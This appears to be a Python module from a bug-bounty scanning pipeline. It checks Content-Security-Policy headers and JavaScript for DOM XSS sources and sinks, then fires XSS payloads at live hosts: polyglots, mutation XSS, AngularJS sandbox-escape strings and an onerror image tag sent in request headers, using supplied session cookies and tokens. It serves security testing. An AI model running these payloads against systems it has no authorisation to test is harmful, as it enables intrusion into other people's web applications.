#!/usr/bin/env python3
# modules/step40_xss_advanced.py — Advanced XSS: mXSS + DOM + CSP Analysis
# NEW MODULE — Cycle 8
# Source: XSS Payloads Book (665) + Bug Bounty Bootcamp Ch6 — advanced XSS
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, urllib.request, urllib.error, urllib.parse, shutil
from core.utils import safe_read

# CSP directives analysis
CSP_SAFE_DIRECTIVES = {
    "default-src": ["'none'", "'self'"],
    "script-src":  ["'none'", "'self'"],
    "object-src":  ["'none'"],
    "base-uri":    ["'none'", "'self'"],
}

CSP_UNSAFE_PATTERNS = [
    (re.compile(r"script-src[^;]*'unsafe-inline'", re.I),
     "unsafe-inline in script-src — CSP bypassed by inline scripts"),
    (re.compile(r"script-src[^;]*'unsafe-eval'",   re.I),
     "unsafe-eval in script-src — eval() allowed, CSP weakened"),
    (re.compile(r"default-src\s+'none'.*script-src\s+\*", re.I),
     "Wildcard script-src — any domain can load scripts"),
    (re.compile(r"script-src[^;]*data:", re.I),
     "data: URI in script-src — data: scripts allowed"),
    (re.compile(r"script-src[^;]*http:", re.I),
     "http: scheme in script-src — insecure script loading"),
    (re.compile(r"script-src[^;]*(cdn\.jsdelivr|cdnjs\.cloudflare|unpkg\.com)", re.I),
     "CDN whitelisted in CSP — JSONP bypass possible"),
    (re.compile(r"frame-ancestors\s+\*", re.I),
     "frame-ancestors: * — clickjacking protection absent"),
    (re.compile(r"(?<!frame-)ancestors\s+'none'", re.I),
     "Missing frame-ancestors — clickjacking possible"),
]

# Angular template injection (CSP bypass)
ANGULAR_PAYLOADS = [
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
    "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
]

# DOM XSS sources and sinks
DOM_SOURCES = [
    "location.search", "location.hash", "location.href",
    "document.referrer", "document.URL", "document.baseURI",
    "window.name", "postMessage",
]
DOM_SINKS = [
    r"innerHTML\s*[+=]",    r"outerHTML\s*[+=]",
    r"document\.write\(",   r"document\.writeln\(",
    r"eval\(",              r"Function\(",
    r"setTimeout\(",        r"setInterval\(",
    r"insertAdjacentHTML\(",r"\.html\(",
    r"location\s*=",       r"location\.href\s*=",
    r"location\.assign\(",  r"location\.replace\(",
    r"\$\(",                r"jQuery\(",
]


class Step40XssAdvanced:
    """
    Advanced XSS Engine.
    XSS Payloads Book + Bug Bounty Bootcamp Ch6:
    1. mXSS (mutation XSS) — innerHTML re-parsing bypass
    2. DOM XSS — source → sink flow analysis in JS files
    3. CSP analysis — find weaknesses and bypass opportunities
    4. Polyglot testing — multi-context payloads
    5. Angular template injection (CSP bypass)
    6. XSS via file upload (SVG/HTML)
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files.get("xss_adv_results",
                             f"{p.out}/{p.prefix}_xss_advanced.txt")
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        urls  = safe_read(p.files.get("urls",""))
        js_f  = p.files.get("js_files","")
        found = 0

        if not live:
            p.log.warn("XSS Advanced: no live hosts"); return

        auth_h = self._build_auth(p)
        p.log.info(f"XSS Advanced V7: mXSS + DOM + CSP + polyglot + Angular")

        # Phase 1: CSP analysis (all hosts)
        for host in live[:8]:
            r = self._analyze_csp(host, auth_h, out)
            found += r

        # Phase 2: Polyglot XSS (parameterized URLs)
        param_urls = [u for u in urls if "=" in u][:40]
        r = self._test_polyglots(param_urls, auth_h, out)
        found += r

        # Phase 3: mXSS testing
        r = self._test_mxss(param_urls[:20], auth_h, out)
        found += r

        # Phase 4: DOM XSS via JS analysis
        r = self._analyze_dom_xss(js_f, live, out)
        found += r

        # Phase 5: Angular template injection
        for host in live[:5]:
            r = self._test_angular_injection(host, param_urls, auth_h, out)
            found += r

        # Phase 6: XSS in HTTP headers
        for host in live[:5]:
            r = self._test_header_xss(host, auth_h, out)
            found += r

        p.log.success(f"XSS Advanced V7: {found} findings")

    # ── Phase 1: CSP Analysis ─────────────────────────────────────────────────
    def _analyze_csp(self, host: str, auth_h: dict, out: str) -> int:
        """
        BB Bootcamp Ch6: CSP misconfig = XSS filter bypassed.
        Analyze Content-Security-Policy header for weaknesses.
        """
        found = 0
        try:
            req  = urllib.request.Request(
                host, headers={**auth_h, "User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            hdrs = {k.lower(): v for k,v in resp.headers.items()}
        except Exception:
            return 0

        csp = hdrs.get("content-security-policy","")
        if not csp:
            # No CSP at all = XSS will execute freely
            detail = (f"No Content-Security-Policy header — XSS payloads "
                      f"will execute without restriction at {host}")
            self._save(out,"medium","NO_CSP",host,detail)
            found += 1
            return found

        # Check each weakness pattern
        for pattern, description in CSP_UNSAFE_PATTERNS:
            if pattern.search(csp):
                detail = f"CSP Weakness: {description} | CSP: {csp[:100]}"
                self._save(out,"medium","CSP_WEAKNESS",host,detail)
                found += 1

        # Check for nonce — can we predict it?
        nonce_m = re.search(r"'nonce-([A-Za-z0-9+/=]+)'", csp)
        if nonce_m:
            nonce = nonce_m.group(1)
            if len(nonce) < 16:
                detail = (f"CSP nonce too short ({len(nonce)} chars): "
                          f"'{nonce}' — may be predictable")
                self._save(out,"high","CSP_WEAK_NONCE",host,detail)
                found += 1

        # Log CSP presence
        self.p.log.info(f"  CSP: {host[:40]} → {csp[:60]}...")
        return found

    # ── Phase 2: Polyglot XSS ─────────────────────────────────────────────────
    def _test_polyglots(self, urls: list, auth_h: dict, out: str) -> int:
        """
        XSS Payloads Book: polyglot payloads work across multiple contexts.
        Test each URL with polyglots to maximize coverage.
        """
        from engines.xss_payloads_db import POLYGLOTS
        found = 0

        for url in urls[:30]:
            try:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            except Exception:
                continue
            if not qs: continue

            for param in list(qs.keys())[:2]:
                for payload, bypass_type, fp_risk in POLYGLOTS:
                    qs_mod = {k: list(v) for k,v in qs.items()}
                    qs_mod[param] = [payload]
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(
                            query=urllib.parse.urlencode(qs_mod, doseq=True)))
                    resp = self._fetch(test_url, auth_h)
                    if not resp: continue
                    body = resp.get("body","")

                    if payload in body and not self._is_encoded(body):
                        detail = (f"Polyglot XSS ({bypass_type}): "
                                  f"param={param} reflected unencoded")
                        self._save(out,"high","XSS_POLYGLOT",test_url,detail)
                        found += 1
                        break
        return found

    # ── Phase 3: mXSS ─────────────────────────────────────────────────────────
    def _test_mxss(self, urls: list, auth_h: dict, out: str) -> int:
        """
        XSS Payloads Book: Mutation XSS — browser re-parses innerHTML
        and creates XSS from apparently safe input.
        """
        from engines.xss_payloads_db import MXSS_PAYLOADS
        found = 0

        for url in urls[:15]:
            try:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            except Exception:
                continue
            if not qs: continue

            for param in list(qs.keys())[:2]:
                for payload, bypass_type, fp_risk in MXSS_PAYLOADS:
                    qs_mod = {k: list(v) for k,v in qs.items()}
                    qs_mod[param] = [payload]
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(
                            query=urllib.parse.urlencode(qs_mod, doseq=True)))
                    resp = self._fetch(test_url, auth_h)
                    if not resp: continue
                    body = resp.get("body","")

                    # mXSS: check if any XSS-triggering mutation appeared
                    if (re.search(r'onerror\s*=', body, re.I) or
                            re.search(r'onload\s*=', body, re.I)):
                        if not self._is_encoded(body):
                            detail = (f"mXSS ({bypass_type}): mutation "
                                      f"triggered XSS in param={param}")
                            self._save(out,"high","MXSS",test_url,detail)
                            found += 1
                            break
        return found

    # ── Phase 4: DOM XSS JS analysis ─────────────────────────────────────────
    def _analyze_dom_xss(self, js_file: str, live: list, out: str) -> int:
        """
        BB Bootcamp Ch6: trace source → sink in JS for DOM XSS.
        """
        found  = 0
        js_urls = safe_read(js_file)[:20] if js_file else []

        # Also try common JS paths
        for host in live[:3]:
            for path in ["/static/js/main.js","/assets/js/app.js","/bundle.js"]:
                js_urls.append(host.rstrip("/") + path)

        for js_url in js_urls[:25]:
            try:
                req = urllib.request.Request(
                    js_url, headers={"User-Agent": self.p.bypass.ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                js   = resp.read(500000).decode("utf-8","ignore")
            except Exception:
                continue

            found_sources = [s for s in DOM_SOURCES if s in js]
            found_sinks   = [s for s in DOM_SINKS
                             if re.search(s, js)]

            if found_sources and found_sinks:
                # Check for missing sanitization
                has_sanitize = any(
                    x in js.lower() for x in
                    ["dompurify","sanitize","escapehtml","htmlentities",
                     "htmlspecialchars","createtextnode"]
                )
                sev    = "medium" if has_sanitize else "high"
                detail = (f"DOM XSS: source={found_sources[0]} → "
                          f"sink={found_sinks[0]} in {js_url[:60]}"
                          f"{' (sanitized)' if has_sanitize else ' — NO sanitization'}")
                self._save(out, sev, "DOM_XSS_FLOW", js_url, detail)
                found += 1

        return found

    # ── Phase 5: Angular template injection ───────────────────────────────────
    def _test_angular_injection(self, host: str, urls: list,
                                 auth_h: dict, out: str) -> int:
        """CSP bypass via Angular template injection."""
        found = 0
        # Detect Angular
        resp = self._fetch(host, auth_h)
        if not resp: return 0
        body = resp.get("body","")
        if not any(x in body for x in ["ng-app","angular.js","angularjs","ng-controller"]):
            return 0

        self.p.log.info(f"  Angular detected: {host[:40]}")

        for url in [u for u in urls if host.split("//")[-1] in u][:10]:
            try:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            except Exception:
                continue
            if not qs: continue

            for param in list(qs.keys())[:2]:
                for payload in ANGULAR_PAYLOADS[:3]:
                    qs_mod = {k: list(v) for k,v in qs.items()}
                    qs_mod[param] = [payload]
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(
                            query=urllib.parse.urlencode(qs_mod, doseq=True)))
                    resp = self._fetch(test_url, auth_h)
                    if not resp: continue
                    body = resp.get("body","")

                    if payload not in body and "alert" not in body:
                        continue
                    if "1" in body and "constructor" not in body:
                        detail = (f"Angular SSTI/XSS: template evaluated "
                                  f"'{payload[:50]}' in param={param}")
                        self._save(out,"high","ANGULAR_XSS",test_url,detail)
                        found += 1
                        break
        return found

    # ── Phase 6: XSS in HTTP headers ─────────────────────────────────────────
    def _test_header_xss(self, host: str, auth_h: dict, out: str) -> int:
        """
        Test if Referer/User-Agent/Accept headers are reflected in response.
        """
        found   = 0
        PAYLOAD = "<img src=x onerror=alert(1)>"
        headers_to_test = {
            "Referer":    PAYLOAD,
            "User-Agent": PAYLOAD,
            "X-Forwarded-For": PAYLOAD,
            "X-Custom-Header": PAYLOAD,
            "Accept-Language": PAYLOAD,
        }
        for hdr, payload in headers_to_test.items():
            hdrs = {**auth_h, hdr: payload,
                    "User-Agent": self.p.bypass.ua()}
            resp = self._fetch(host, hdrs)
            if not resp: continue
            body = resp.get("body","")
            if payload in body and not self._is_encoded(body):
                detail = (f"Reflected Header XSS: {hdr} header "
                          f"reflected unencoded in response")
                self._save(out,"high","HEADER_XSS",host,detail)
                found += 1
        return found

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _is_encoded(self, body: str) -> bool:
        return any(x in body for x in ["&lt;","&gt;","&amp;","\\u003c","%3C"])

    def _build_auth(self, p) -> dict:
        hdrs = {}
        c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
        a = getattr(p.args,"authorization",None) or getattr(p.args,"auth",None)
        if c: hdrs["Cookie"] = c
        if a: hdrs["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        return hdrs

    def _fetch(self, url: str, headers: dict, timeout: int = 8) -> dict:
        try:
            req  = urllib.request.Request(url, headers=headers)
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(50000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(5000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "xss-advanced-v7", response=response, payload=payload)
